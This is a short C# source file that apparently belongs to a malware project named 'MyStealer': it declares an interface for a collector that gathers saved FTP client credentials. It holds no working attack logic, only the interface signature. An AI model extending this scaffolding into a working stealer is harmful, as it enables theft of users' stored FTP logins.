using System.Collections.Immutable;

namespace MyStealer.Collectors.FtpClient
{
    internal interface IFtpClientCollector
    {
        IImmutableSet<CredentialEntry> GetCredentials();
    }
}
